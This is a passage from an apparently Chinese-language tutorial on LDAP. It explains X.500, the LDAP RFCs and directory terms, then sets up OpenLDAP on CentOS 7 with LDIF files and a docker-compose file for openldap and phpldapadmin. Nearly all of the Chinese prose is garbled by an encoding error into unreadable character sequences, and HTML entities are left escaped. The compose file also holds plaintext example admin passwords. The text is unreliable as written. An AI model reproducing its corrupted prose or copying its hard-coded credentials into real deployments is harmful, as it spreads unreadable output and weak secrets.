·å°±å¯ä»¥åšåˆ°å•ç‚¹ç™»å½•\nç™½é¡µï¼šä¸ªäººé€šä¿¡ç›®å½•ï¼Œè¿™ä¸ªåœ¨ä¸Šä¸–çºªçš„ç¾å›½ç”µå½±ä¸­èƒ½è§åˆ°ã€‚ä¸ºä»€ä¹ˆæ˜¯ç™½é¡µâ€”ä»¥å‰ä½¿ç”¨ç™½è‰²çº¸å¼ è®°å½•ä¸ªäººé€šä¿¡ç›®å½•ã€‚é»„é¡µä¹Ÿæ˜¯è¿™ä¸ªåŸå› ã€‚ é»„é¡µï¼šä¼ä¸šå’Œå›¢ä½“é€šä¿¡ç›®å½•ï¼Œä¾‹å¦‚80ã€90åç†ŸçŸ¥çš„hao123ç½‘å€é»„é¡µ\nProtocol Brief Introduction ä¸LDAPç›¸å…³çš„åè®®å¾ˆå¤šï¼Œä½†ä¸»è¦æ˜¯ä¸¤ä¸ªç³»åˆ—ï¼Œè¿™é‡Œåˆ—å‡ºï¼Œä»…åšäº†è§£ç”¨ï¼Œæ„Ÿå…´è¶£å¯ä»¥ç¿»çœ‹\nSeries Protocol X.500 X.500ç³»åˆ—åè®®\nç›®å½•æœåŠ¡çš„æœ€åˆåè®®ï¼Œå®Œæ•´åœ°æè¿°äº†ç›®å½•ã€ç›®å½•æœåŠ¡çš„ç»„æˆã€ç›®å½•ç»“æ„ç­‰å†…å®¹ã€‚X.500æœ¬èº«åªæ˜¯ä¸€ä¸ªæ¦‚è§ˆï¼Œå„éƒ¨åˆ†çš„å®ç°åœ¨å…¶å­åè®®å¦‚X.501ã€X.502ä¸­ï¼Œæ‰€ä»¥è¯´X.500æ˜¯ä¸€ä¸ªç³»åˆ—åè®®ã€‚\nå€¼å¾—ä¸€æçš„æ˜¯ï¼Œå¸¸è§çš„X.509å…¬é’¥è¯ä¹¦ä¹Ÿå±äºè¯¥ç³»åˆ—åè®®ã€‚\nLDAP LDAPå¹¶éåªæœ‰ä¸€ä¸ªåè®®æ–‡ä»¶ï¼Œå…¶æ¶‰åŠåˆ°æ–¹æ–¹é¢é¢ï¼Œæ¯ä¸ªæ–¹é¢å•ç‹¬ç”±ä¸€ä¸ªåè®®æ–‡ä»¶æè¿°ï¼ŒåŠ æ˜Ÿå·çš„ç›¸å¯¹æ¥è¯´å¾ˆé‡è¦\nLDAPç³»åˆ—åè®®\nRFC4511*ï¼šé€šè¿‡TCPä¼ è¾“æ¶ˆæ¯çš„æ–¹å¼ï¼Œè§„å®šäº†ä¼ è¾“å±‚é¢çš„æ¶ˆæ¯ç±»å‹ã€æ¶ˆæ¯å†…å®¹ï¼Œå¦‚ç»‘å®šã€æŸ¥è¯¢ç­‰\nRFC4512*ï¼šä¿¡æ¯æ¨¡å‹ï¼Œè§„å®šäº†schemaã€object classã€attribute typeç­‰å†…å®¹\nRFC4513*ï¼šè§„å®šäº†é‰´æƒæ–¹å¼å’Œå®‰å…¨æœºåˆ¶ï¼šTLSã€SASL\nRFC4514ï¼šè§„å®šäº†DNçš„å­—ç¬¦ä¸²è¡¨ç¤ºæ–¹å¼\nRFC4515ï¼šè§„å®šäº†è¿‡æ»¤å™¨çš„æ ¼å¼ï¼Œè¿‡æ»¤å™¨ç”¨äºæŸ¥æ‰¾æ—¶æŒ‡å®šæ¡ä»¶\nRFC4516ï¼šè§„å®šäº†ç»Ÿä¸€èµ„æºå®šä½ç¬¦çš„æ ¼å¼ï¼Œå³LDAPç«¯ç‚¹é•¿å•¥æ ·\nRFC4517*ï¼šè¯­æ³•å’ŒåŒ¹é…è§„åˆ™ï¼Œåˆ—ä¸¾äº†æ‰€æœ‰å…è®¸çš„è¯­æ³•å’ŒåŒ¹é…è§„åˆ™\nRFC4518ï¼šå­—ç¬¦ä¸²å›½é™…åŒ–\nRFC4519*ï¼šåº”ç”¨ç¨‹åºçš„schemaï¼Œåˆ—ä¸¾äº†æ‰€æœ‰å…è®¸çš„object classå’Œattribute type\nRFC2377*ï¼šæ¨èçš„DITç»„ç»‡æ–¹å¼ï¼Œå³ç›®å½•æœåŠ¡çš„æ ‘çš„ç»„ç»‡æ–¹å¼\nAbbr LDAP æ€»æ˜¯ä¼šæœ‰ä¸€å¤§å †ç›¸å…³ç¼©å†™ï¼Œè¿™é‡Œåˆ—å‡ºå¸¸è§çš„\nå¸¸è§ DAP - Directory Access Protocolï¼Œå³ç›®å½•è®¿é—®åè®®\nLDAP - Lightweight Directory Access Protocolï¼Œè½»é‡çº§ç›®å½•è®¿é—®åè®®\nDIB - Directory Information Baseï¼Œç›®å½•ä¿¡æ¯åº“\nDIT - Directory Information Treeï¼Œç›®å½•ä¿¡æ¯æ ‘\nDUA - Directory User Agentï¼Œç”¨æˆ·ä»£ç†\nDN - Distinguished Nameï¼Œå¯åŒºåˆ«åç§°ï¼Œå³å”¯ä¸€åç§°\nRDN - Relative Distinguished Nameï¼Œç›¸å¯¹å”¯ä¸€åç§°ï¼ŒæŒ‡DITå†…æŸä¸ªèŠ‚ç‚¹ä¸Šçš„åç§°ï¼Œä¸Šå±‚èŠ‚ç‚¹çš„DNé…åˆä¸Šæœ¬èŠ‚ç‚¹çš„RDNï¼Œèƒ½å¤Ÿæ„æˆæœ¬èŠ‚ç‚¹çš„DN\nä¸€äº›å±æ€§ç±»å‹çš„ä»‹ç» c - country nameï¼Œå›½å®¶å\ncn - common nameï¼Œé€šç”¨åç§°\ndc - domain componentï¼ŒåŸŸåç»„ä»¶\no - organization nameï¼Œæœºæ„å\nou - organization unit nameï¼Œæœºæ„çš„å•ä½å\nsn - surnameï¼Œå§“\nst - state or province nameï¼Œå·æˆ–çœ\nUnderstand X.500 å¦‚æœä¸çœ‹X.500åè®®ï¼ŒLDAPä¸­çš„å¾ˆå¤šä¸œè¥¿æ˜¯çœ‹ä¸æ‡‚çš„ã€‚X.500å®šä¹‰äº†ç›®å½•æœåŠ¡ï¼ŒLDAPåªæ˜¯å®ƒçš„è½»é‡çº§å®ç°ã€‚\næ‰€ä»¥å¦‚æœå¯¹ X.500 æœ‰ä¸€äº›å·®ä¸å¤šçš„è®¤çŸ¥ï¼ŒLDAPå°±å·²ç»å¯ä»¥ç†è§£äº†ï¼Œæ¯•ç«Ÿæ˜¯é˜‰å‰²ç‰ˆ\næˆ‘ä»¬çœ‹çœ‹ X.500 è§„å®šäº†ä»€ä¹ˆã€‚\nå®šä¹‰ç›®å½•ç³»ç»Ÿ Directoryæ—¨åœ¨æä¾›ä¸€ä¸ªç”¨æˆ·å‹å¥½çš„name-addressç±»çš„æ˜ å°„ï¼Œå…¶ä¸­nameä¸å¯å˜ï¼Œaddresså…è®¸åŠ¨æ€å˜åŒ–ï¼Œå³key-valueç»“æ„ã€‚Directoryç”±ä¸€æ‰¹ç³»ç»Ÿç»„æˆï¼Œæ¯ä¸ªç³»ç»ŸæŒæœ‰å¯¹åº”ç°å®ä¸–ç•Œçš„é€»è¾‘æ•°æ®ï¼Œè¿™äº›å­˜å‚¨çš„æ•°æ®å«åšDIBï¼Œå³ç›®å½•ä¿¡æ¯åº“ã€‚æ•´ä½“æ¶æ„å¦‚ä¸‹\nä¸€ä¸ªæ ‡å‡†çš„ç›®å½•ç³»ç»Ÿï¼Œæœ‰ä»¥ä¸‹å‡ éƒ¨åˆ†\nç›®å½•æœåŠ¡ ç›®å½•æœåŠ¡çš„ç”¨æˆ· è®¿é—®ç«¯ç‚¹-ç›®å½•æœåŠ¡ç”¨æ¥æš´éœ²è‡ªå·± ç”¨æˆ·å’ŒæœåŠ¡ä¹‹é—´ä½¿ç”¨åè®®å¦‚LDAPè¿›è¡Œäº¤äº’ ç”¨æˆ·ä½¿ç”¨LDAPå®¢æˆ·ç«¯è®¿é—®ç›®å½•æœåŠ¡ DIBä¸DIT ç›®å½•ä¿¡æ¯åº“ï¼Œç”±DITï¼ˆç›®å½•ä¿¡æ¯æ ‘ï¼‰ã€èŠ‚ç‚¹Entryã€Entryä¸­çš„å±æ€§åŠå±æ€§å€¼æ„æˆã€‚\nEntryä»£è¡¨ä¸€ä¸ªèŠ‚ç‚¹ï¼Œç±»å‹å¯ä»¥æ˜¯objectï¼Œä¹Ÿå¯ä»¥æ˜¯aliasï¼Œåè€…è¡¨ç¤ºä¸€ä¸ªobject entryçš„åˆ«å ä¸€ä¸ªEntryå†…å¯ä»¥æ‹¥æœ‰å¤šä¸ªå±æ€§ ä¸€ä¸ªå±æ€§å†…å¯ä»¥æ‹¥æœ‰ä¸€ä¸ªTypeï¼Œä»¥åŠå¤šä¸ªValue ä¸‹å›¾å±•ç¤ºäº†ä¸€ä¸ªDITçš„æ ‘å½¢ç»“æ„ï¼š\nä¸€ä¸ªå‡è®¾çš„DITå¦‚ä¸‹\nåˆ™DNï¼š{C=GB, L=Winslow, O=Graphic Services, CN=Laser Printer}ä»£è¡¨äº†Laser Printerã€‚\nä½ å¯èƒ½ä¼šæƒ³ï¼ŒDIBå’Œå¸¸è§çš„æ•°æ®åº“æœ‰ä»€ä¹ˆå…³ç³»å‘¢ï¼Ÿ\nå®é™…ä¸Šä»–ä»¬æ²¡ä»€ä¹ˆå…³ç³»\nç±»ä¼¼HTTPå’ŒTCPã€‚ç¡¬è¦è¯´æœ‰å…³ç³»çš„è¯ï¼ŒDIBæ›´åŠ å‚ç›´å§ğŸ¤”ï¼Œä»…é€‚ç”¨äºè¿™ç§æ ‘å½¢å­˜å‚¨ç»“æ„ï¼ŒæŸ¥è¯¢å¤šã€æ›´æ–°å°‘ï¼›\næ•°æ®åº“åˆ™æ›´åŠ é€šç”¨ï¼Œç›¸å¯¹è€Œè¨€ä¹Ÿæ›´åŠ åº•å±‚ã€‚\nDIBåªæ˜¯è§„å®šäº†ä¸€ç§å­˜å‚¨é”®å€¼å¯¹æ•°æ®çš„æ ‘å½¢ç»“æ„ï¼Œå¯ä»¥ç”¨ä»»ä½•æ–¹å¼å®ç°DIBï¼ŒåŒ…æ‹¬å…³ç³»å‹æ•°æ®åº“ã€‚ç†è®ºä¸Šï¼ŒHTTPä¹Ÿå¯ä»¥æ˜¯å…¶å®ƒå®ç°ï¼Œæ¯”å¦‚QUICã€‚\nç›®å½•æœåŠ¡ å¯¹ç›®å½•çš„ä¸€äº›å¢åˆ æ”¹æŸ¥æ“ä½œï¼Œçœ‹ä¸€çœ¼å°±è¡Œ è¯»æ“ä½œ\nReadï¼šè¯»æŒ‡å®šçš„entryã€‚LDAPä¸æ”¯æŒæ­¤æ“ä½œ Compareï¼šæ¯”è¾ƒç»™çš„å€¼å’ŒæŒ‡å®šentryçš„å€¼æ˜¯å¦ä¸€è‡´ã€‚è¿™ä¸ªåœ¨éªŒè¯å¯†ç æ—¶æœ‰ç”¨ Listï¼šåˆ—å‡ºæŒ‡å®šentryçš„æ‰€æœ‰å­entry Searchï¼šåˆ—å‡ºæ»¡è¶³æŒ‡å®šè¿‡æ»¤å™¨çš„æ‰€æœ‰entry Abandonï¼šæ”¾å¼ƒï¼Œä½œç”¨åœ¨ä¸€ä¸ªæŒ‚èµ·è¯·æ±‚ä¸Šï¼Œæ ‡è¯†å®¢æˆ·ç«¯å¯¹è¯¥è¯·æ±‚ä¸åœ¨æ„Ÿå…´è¶£ ä¿®æ”¹æ“ä½œ\næ·»åŠ entry ç§»é™¤entry ä¿®æ”¹entry ä¿®æ”¹DNï¼Œä¿®æ”¹æŸä¸ªentryçš„ç›¸å¯¹åç§°ã€‚å¦‚æœè¯¥entryæœ‰å­èŠ‚ç‚¹ï¼Œåˆ™å­èŠ‚ç‚¹çš„è¿™éƒ¨åˆ†åå­—ä¹Ÿä¼šè¢«ä¿®æ”¹ å…¶å®ƒå¯èƒ½çš„è¾“å‡º\né”™è¯¯ è½¬ç§»ï¼ˆreferralï¼‰ï¼šå¯èƒ½å½“å‰æœåŠ¡æ— æ³•å¤„ç†è¿™ä¸ªè¯·æ±‚ï¼Œå®ƒä¼šè¿”å›ä¸€ä¸ªæ–°çš„ç«¯ç‚¹ï¼Œç±»ä¼¼HTTPçš„é‡å®šå‘ åˆ†å¸ƒå¼Directory DSAï¼šDirectory System Agentã€‚ç”¨æ¥è¿æ¥æœåŠ¡å’ŒDUAã€‚ä»–å¯ä»¥ç¼“å­˜Directoryæ•°æ®ï¼Œå¯ä»¥ç”¨æœ¬åœ°æ•°æ®ç›´æ¥å“åº”ï¼Œä¹Ÿå¯ä»¥å•çº¯åšä¸€ä¸ªè½¬å‘ LDAP Serverï¼šæ˜¯Directory Serviceçš„ä¸€éƒ¨åˆ†ã€‚ä»–å¯ä»¥ç›´æ¥ä½¿ç”¨æœ¬åœ°æ•°æ®ï¼Œä¹Ÿå¯ä»¥è½¬å‘åˆ°å…¶å®ƒLDAP Serverè·å–æ•°æ® å…¶å®ƒ åè®®è¿˜è§„å®šäº†ç›®å½•æœåŠ¡çš„è®¿é—®å®‰å…¨ã€å¤‡ä»½ç­‰æ“ä½œï¼Œè¿™é‡Œæš‚æ—¶å¿½ç•¥ã€‚ä¹‹åå€¼å¾—æ¢ç©¶çš„å€’æ˜¯å…¶å®‰å…¨åè®® X.509\nLDAP\u0026rsquo;s Safety Specifications ä½¿ç”¨TLSå®‰å…¨ä¼ è¾“ æä¾›ç®€å•çš„åŒ¿åå’Œè´¦å·å¯†ç è®¤è¯ æ”¯æŒSASLæ„å»ºé‰´æƒå’Œå®‰å…¨æœåŠ¡å±‚ The Practice of LDAP LDAPç›®å‰æœ€å¸¸ç”¨çš„ç”¨é€”æ˜¯åšå•ç‚¹ç™»å½•ï¼Œåœ¨è¿™ä¸ªåœºæ™¯ä¸­ LDAP ä¸€èˆ¬å­˜å‚¨å…³äºç”¨æˆ·ã€ç”¨æˆ·è®¤è¯ä¿¡æ¯ã€ç»„ã€ç”¨æˆ·æˆå‘˜ç­‰ç­‰ï¼Œå……å½“ä¸€ä¸ªç”¨æˆ·ä¿¡æ¯çš„ä¸­å¿ƒä»“åº“ï¼Œé€šå¸¸ä½¿ç”¨ä¸ºç”¨æˆ·è®¤è¯å’Œæˆæƒ\nä½¿ç”¨å‘½ä»¤è¡Œæ„é€ LDAPæ ‘ç»“æ„ ï¼ï¼ï¼ï¼\nç”±äºè¯¥æ–¹å¼è¿‡äºåº•å±‚ï¼Œåç¦»å­¦ä¹ åˆè¡·ï¼Œæ•…å‘½ä»¤è¡Œæ–¹å¼æ„é€ æ•°æ®æ ‘çš„å®éªŒç¬”è€…ä»…åšè®°å½•\nä¸åŒç‰ˆæœ¬çš„ Linux å®‰è£…æ–¹æ³•å·®åˆ«éå¸¸å¤§ï¼\næ­¤æ¬¡å®éªŒè®°å½•çš„æ˜¯å¿«é€Ÿæ­å»ºä¸€ä¸ª LDAP å­¦ä¹ å’Œæµ‹è¯•ç¯å¢ƒï¼Œæ²¡æœ‰è¿›è¡Œå…¶ä»–é«˜çº§é…ç½®ã€‚å»ºè®®ä½¿ç”¨è™šæ‹Ÿæœºå’Œå…¨æ–°å®‰è£…çš„ç³»ç»Ÿè¿›è¡Œæ“ä½œã€‚\nLDIF LDAP Data Interchange Formatï¼Œæ˜¯ä¸€ä¸ªæ ¼å¼åŒ–æ–‡ä»¶\nLDAP æ•°æ®äº¤æ¢æ ¼å¼æ–‡ä»¶ï¼Œå®ƒä»¥æ–‡æœ¬å½¢å¼å­˜å‚¨ï¼Œç”¨äºåœ¨æœåŠ¡å™¨ä¹‹é—´äº¤æ¢æ•°æ®ã€‚\næ·»åŠ æ•°æ®ä»¥åŠä¿®æ”¹æ•°æ®éƒ½éœ€è¦é€šè¿‡ LDIF æ–‡ä»¶æ¥è¿›è¡Œï¼Œå¯ä»¥è·Ÿå…³ç³»å‹æ•°æ®åº“çš„ SQL æ–‡ä»¶åšç±»æ¯”ã€‚\nLDIF æ–‡ä»¶çš„æ ¼å¼ä¸€èˆ¬å¦‚ä¸‹ï¼š\n1 2 3 4 dn: \u0026lt;è¯†åˆ«å\u0026gt; \u0026lt;å±æ€§ 1\u0026gt;: \u0026lt;å€¼ 1\u0026gt; \u0026lt;å±æ€§ 2\u0026gt;: \u0026lt;å€¼ 2\u0026gt; ... LDAP å‘½ä»¤è¡Œæ„é€ æ•°æ® æœ¬æ¬¡æ¶‰åŠè½¯ä»¶ï¼š\næ“ä½œç³»ç»Ÿï¼šCentOS 7.4.1708 æœ€å°å®‰è£…ï¼ˆå·²å…³é—­ SELinux å’Œé˜²ç«å¢™ï¼‰ åº”ç”¨è½¯ä»¶ï¼šopenldap 2.4.44 ã€phpldapadmin 1.2.3 CentOS 7 ä¸Šå®‰è£…å¹¶ä½¿ç”¨ OpenLDAP yum install -y openldap-clients openldap-servers\nåˆ›å»ºæ•°æ®åº“é…ç½®æ–‡ä»¶ cp /usr/share/openldap-servers/DB_CONFIG.example /var/lib/ldap/DB_CONFIG \u0026amp;\u0026amp; chown ldap:ldap /var/lib/ldap/DB_CONFIG å¯åŠ¨ OpenLDAP æœåŠ¡ å¼€å¯ï¼šsystemctl start slapd å¼€æœºè‡ªå¯ï¼šsystemctl enable slapd\nå¦‚æœæ²¡æœ‰å‡ºç°é”™è¯¯ï¼Œé‚£ä¹ˆ OpenLDAP çš„å®‰è£…å°±ç®—å®Œæˆäº†ï¼Œä¸è¿‡å½“å‰çš„ç›®å½•æ•°æ®åº“è¿˜æ˜¯ç©ºçš„ï¼Œä¸‹é¢æˆ‘ä»¬è¦å¯¹æ•°æ®åº“è¿›è¡Œåˆå§‹åŒ–ã€‚\nè®¾ç½® OpenLDAP ç®¡ç†å‘˜å¯†ç  slappasswd\nè¾“å…¥å¯†ç ï¼Œç¡®è®¤åä¼šç”Ÿæˆ{SSHA}xxxxxè¿™æ ·çš„ä¸œè¥¿ï¼Œè®°ä½œpasswdAå€¼\nç”Ÿæˆ LDIF æ–‡ä»¶ cat \u0026lt;\u0026lt; EOF \u0026gt; chrootpw.ldif\nç„¶åå°†ä¸‹æ–¹æ–‡æœ¬ä¿®æ”¹å¯¹åº”å†…å®¹åï¼Œå»æ‰æ‰€æœ‰æ³¨é‡Šï¼Œç„¶ååœ¨å‘½ä»¤è¡Œä¸­ç²˜è´´å›è½¦\n1 2 3 4 5 dn: olcDatabase={0}config,cn=config changetype: modify add: olcRootPW olcRootPW: {SSHA}xxxxx #{SSHA}xxxxx ä¿®æ”¹ä¸ºä¸Šä¸€æ­¥è®°ä¸‹æ¥çš„ passwdAå€¼ EOF æ‰§è¡Œ LDIF æ–‡ä»¶ ldapadd -Y EXTERNAL -H ldapi:/// -f chrootpw.ldif\nå¯¼å…¥é¢„è®¾çš„æ¨¡å¼ find /etc/openldap/schema/ -name \u0026quot;*.ldif\u0026quot; -exec ldapadd -Y EXTERNAL -H ldapi:/// -D \u0026quot;cn=config\u0026quot; -f {} \\;\næ¥ä¸‹æ¥è¦ä½¿ç”¨å‘½ä»¤è¡Œæ¥æ–°å»ºæ ¹èŠ‚ç‚¹\nç”Ÿæˆæ ¹èŠ‚ç‚¹ç®¡ç†å‘˜å¯†ç  åŒä¸Šä¸€æ¬¡çš„æ“ä½œï¼Œç”Ÿæˆåä¿å­˜ä¸º passwdBBBBå€¼\næ ¹èŠ‚ç‚¹ç®¡ç†å‘˜å¯†ç ä¸ OpenLDAP ç®¡ç†å‘˜å¯†ç ä¸æ˜¯åŒä¸€å›äº‹ï¼ä¸€ä¸ª LDAP æ•°æ®åº“å¯ä»¥åŒ…å«å¤šä¸ªç›®å½•æ ‘ã€‚\nç”Ÿæˆ LDIF æ–‡ä»¶ é¦–å…ˆè¯·æƒ³å¥½ä¸€ä¸ªåŸŸåã€‚ä»¥ zenandidi.com ä¸ºä¾‹ï¼š\nä¸‹é¢æ ¹èŠ‚ç‚¹çš„ DN åº”è¯¥è¿™æ ·å†™ï¼šdc=zenandidi,dc=com\ncat \u0026lt;\u0026lt; EOF \u0026gt; chdomain.ldif\nç„¶åå°†ä¸‹æ–¹æ–‡æœ¬ä¿®æ”¹å¯¹åº”å†…å®¹åï¼Œå»æ‰æ‰€æœ‰æ³¨é‡Šï¼Œç„¶ååœ¨å‘½ä»¤è¡Œä¸­ç²˜è´´å›è½¦\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 dn: olcDatabase={1}monitor,cn=config changetype: modify replace: olcAccess olcAccess: {0}to * by dn.base=\u0026#34;gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth\u0026#34; read by dn.base=\u0026#34;cn=Manager,dc=xxx,dc=xxx\u0026#34; read by * none #ä¿®æ”¹ dc=xxx,dc=xxx ä¸ºè‡ªå·±çš„åŸŸå dn: olcDatabase={2}hdb,cn=config changetype: modify replace: olcSuffix olcSuffix: dc=xxx,dc=xxx #ä¿®æ”¹ dc=xxx,dc=xxx ä¸ºè‡ªå·±çš„åŸŸå dn: olcDatabase={2}hdb,cn=config changetype: modify replace: olcRootDN olcRootDN: cn=Manager,dc=xxx,dc=xxx #ä¿®æ”¹ dc=xxx,dc=xxx ä¸ºè‡ªå·±çš„åŸŸå dn: olcDatabase={2}hdb,cn=config changetype: modify add: olcRootPW olcRootPW: {SSHA}xxxxx #{SSHA}xxxxx ä¿®æ”¹ä¸ºä¸Šä¸€æ­¥è®°ä¸‹æ¥çš„å€¼ dn: olcDatabase={2}hdb,cn=config changetype: modify add: olcAccess olcAccess: {0}to attrs=userPassword,shadowLastChange by dn=\u0026#34;cn=Manager,dc=xxx,dc=xxx\u0026#34; write by anonymous auth by self write by * none #ä¿®æ”¹ dc=xxx,dc=xxx ä¸ºè‡ªå·±çš„åŸŸå olcAccess: {1}to dn.base=\u0026#34;\u0026#34; by * read olcAccess: {2}to * by dn=\u0026#34;cn=Manager,dc=xxx,dc=xxx\u0026#34; write by * read #ä¿®æ”¹ dc=xxx,dc=xxx ä¸ºè‡ªå·±çš„åŸŸå EOF æ‰§è¡Œ LDIF æ–‡ä»¶ ldapmodify -Y EXTERNAL -H ldapi:/// -f chdomain.ldif\næ¥ä¸‹æ¥ï¼Œå¼€å§‹è¿›è¡Œæ·»åŠ ç”¨æˆ·ã€ç»„èŠ‚ç‚¹\nç”Ÿæˆ LDIF æ–‡ä»¶ cat \u0026lt;\u0026lt; EOF \u0026gt; basedomain.ldif\nç„¶åå°†ä¸‹æ–¹æ–‡æœ¬ä¿®æ”¹å¯¹åº”å†…å®¹åï¼Œå»æ‰æ‰€æœ‰æ³¨é‡Šï¼Œç„¶ååœ¨å‘½ä»¤è¡Œä¸­ç²˜è´´å›è½¦\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 dn: dc=xxx,dc=xxx #ä¿®æ”¹ dc=xxx,dc=xxx ä¸ºè‡ªå·±çš„åŸŸå objectClass: top objectClass: dcObject objectclass: organization o: root_ldap dc: xxx #ä¿®æ”¹ xxx ä¸ºè‡ªå·±åŸŸåç¬¬ä¸€ä¸ªç‚¹å·¦è¾¹çš„å†…å®¹ dn: cn=Manager,dc=xxx,dc=xxx #ä¿®æ”¹ dc=xxx,dc=xxx ä¸ºè‡ªå·±çš„åŸŸå objectClass: organizationalRole cn: Manager description: Directory Manager dn: ou=People,dc=xxx,dc=xxx #ä¿®æ”¹ dc=xxx,dc=xxx ä¸ºè‡ªå·±çš„åŸŸå objectClass: organizationalUnit ou: People dn: ou=Group,dc=xxx,dc=xxx #ä¿®æ”¹ dc=xxx,dc=xxx ä¸ºè‡ªå·±çš„åŸŸå objectClass: organizationalUnit ou: Group EOF æ‰§è¡Œ LDIF æ–‡ä»¶ è¯·å…ˆä¿®æ”¹ä¸‹é¢å‘½ä»¤çš„dc=xxx,dc=xxxä¸ºè‡ªå·±çš„åŸŸåç„¶åå†æ‰§è¡Œ\nldapadd -x -D cn=Manager,dc=xxx,dc=xxx -W -f basedomain.ldif\nç„¶åéœ€è¦è¾“å…¥è®¾å®šçš„æ ¹èŠ‚ç‚¹ç®¡ç†å‘˜å¯†ç  ï¼ˆç”ŸæˆpasswdBBBBå€¼æ—¶è¾“å…¥çš„å¯†ç \næ¸…ç† LDIF æ–‡ä»¶ rm basedomain.ldif chdomain.ldif chrootpw.ldif\nè‡³æ­¤ï¼Œä¸€ä¸ª LDAP ç›®å½•æ ‘å°±æ„å»ºå®Œæ¯•äº†ã€‚\nLDAP UIæ“ä½œ ä½†æ˜¯ LDAP çš„å‘½ä»¤è¡Œç®¡ç†å·¥å…·éå¸¸éš¾ç”¨ï¼Œå°¤å…¶æ˜¯å¯¹äºæ–°æ‰‹æ¥è¯´ã€‚\næ‰€ä»¥ï¼Œä¸‹é¢æˆ‘ä»¬æ¥å®‰è£…phpLDAPadminè¿™ä¸ªå›¾å½¢åŒ–ç®¡ç†å·¥å…·ï¼Œæ–¹ä¾¿æ–°æ‰‹å­¦ä¹ \nå¦‚æœä¸Šé¢çš„å‘½ä»¤è¡Œæ“ä½œæœ‰å®é™…æ“ä½œçš„è¯ï¼Œé‚£ä¹ˆå¯ä»¥è·³è½¬åˆ°è¿™é‡Œ\nUIåˆ›å»ºLDAPç¯å¢ƒä¸æ•°æ® è¿›å…¥phpLDAPAdmin è¯¥æ“ä½œä½¿ç”¨docker-composeä¸€é”®éƒ¨ç½²openLDAPã€phpldapadminå’Œself-service-password\nå‡†å¤‡open-ldapçš„docker-composeæ–‡ä»¶ å¦‚ä¸‹ç›´æ¥ç»™å‡ºç¬”è€…çš„å®éªŒdocker-compose\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 version: \u0026#39;2\u0026#39; services: openldap: image: osixia/openldap:1.5.0 ### å¦‚æœæœ‰ç§æœ‰ä»“åº“å¯ä»¥ä»è‡ªå·±çš„ç§æœ‰ä»“åº“æ‹‰å–é•œåƒ container_name: openldap restart: always environment: LDAP_LOG_LEVEL: \u0026#34;256\u0026#34; LDAP_ORGANISATION: \u0026#34;ndzzmc\u0026#34; ### æ‚¨çš„ç»„ç»‡åç§° LDAP_DOMAIN: \u0026#34;gsymgsym.com\u0026#34; ### å…¬å¸åŸŸå LDAP_BASE_DN: \u0026#34;dc=gsymgsym,dc=com\u0026#34; ### æ ¹æ®åŸŸåç»„æˆ LDAP_ADMIN_PASSWORD: \u0026#34;Aa123+Bb\u0026#34; ### å¯†ç è‡ªå·±æ¥è®¾ç½® LDAP_CONFIG_PASSWORD: \u0026#34;Aa123+BbCc\u0026#34; LDAP_READONLY_USER: \u0026#34;false\u0026#34; #LDAP_READONLY_USER_USERNAME: \u0026#34;readonly\u0026#34; #LDAP_READONLY_USER_PASSWORD: \u0026#34;readonly\u0026#34; LDAP_RFC2307BIS_SCHEMA: \u0026#34;false\u0026#34; LDAP_BACKEND: \u0026#34;mdb\u0026#34; #LDAP_TLS: \u0026#34;true\u0026#34; #LDAP_TLS_CRT_FILENAME: \u0026#34;zaq.test.pem\u0026#34; #LDAP_TLS_KEY_FILENAME: \u0026#34;zaq.test.key\u0026#34; #LDAP_TLS_DH_PARAM_FILENAME: \u0026#34;dhparam.pem\u0026#34; #LDAP_TLS_CA_CRT_FILENAME: \u0026#34;ca.crt\u0026#34; #LDAP_TLS_ENFORCE: \u0026#34;false\u0026#34; #LDAP_TLS_CIPHER_SUITE: \u0026#34;SECURE256:-VERS-SSL3.0\u0026#34; # LDAP_TLS_VERIFY_CLIENT: \u0026#34;demand\u0026#34; LDAP_REPLICATION: \u0026#34;false\u0026#34; #LDAP_REPLICATION_CONFIG_SYNCPROV: \u0026#39;binddn=\u0026#34;cn=admin,cn=config\u0026#34; bindmethod=simple credentials=\u0026#34;$$LDAP_CONFIG_PASSWORD\u0026#34; searchbase=\u0026#34;cn=config\u0026#34; type=refreshAndPersist retry=\u0026#34;60 +\u0026#34; timeout=1 starttls=critical\u0026#39; #LDAP_REPLICATION_DB_SYNCPROV: \u0026#39;binddn=\u0026#34;cn=admin,$$LDAP_BASE_DN\u0026#34; bindmethod=simple credentials=\u0026#34;$$LDAP_ADMIN_PASSWORD\u0026#34; searchbase=\u0026#34;$$LDAP_BASE_DN\u0026#34; type=refreshAndPersist interval=00:00:00:10 retry=\u0026#34;60 +\u0026#34; timeout=1 starttls=critical\u0026#39; #LDAP_REPLICATION_HOSTS: \u0026#34;#PYTHON2BASH:[\u0026#39;ldap://ldap.example.org\u0026#39;,\u0026#39;ldap://ldap2.example.org\u0026#39;]\u0026#34; KEEP_EXISTING_CONFIG: \u0026#34;false\u0026#34; LDAP_REMOVE_CONFIG_AFTER_SETUP: \u0026#34;true\u0026#34; #LDAP_SSL_HELPER_PREFIX: \u0026#34;ldap\u0026#34; tty: true stdin_open: true volumes: - /opt/openldap/ldap:/var/lib/ldap - /opt/openldap/slapd.d:/etc/ldap/slapd.d - /opt/openldap/certs:/container/service/lapd/assets/certs ports: - \u0026#34;389:389\u0026#34; - \u0026#34;636:636\u0026#34; # For replication to work correctly, domainname and hostname must be # set correctly so that \u0026#34;hostname\u0026#34;.\u0026#34;domainname\u0026#34; equates to the # fully-qualified domain name for the host. domainname: \u0026#34;gsymgsym.com\u0026#34; hostname: \u0026#34;ldap-server\u0026#34; phpldapadmin: image: osixia/phpldapadmin:latest container_name: phpldapadmin restart: always environment: PHPLDAPADMIN_LDAP_HOSTS: \u0026#34;openldap\u0026#34; ### å¦‚æœéƒ¨ç½²åç™»å½•ä¸è¿›å»æœ‰å¯èƒ½æ˜¯è¿™é‡Œå‡ºäº†é—®é¢˜ï¼Œç›´æ¥æ¢ä¸ºéƒ¨ç½²openldapæœåŠ¡çš„å¯è¾¾IPè¯•è¯• 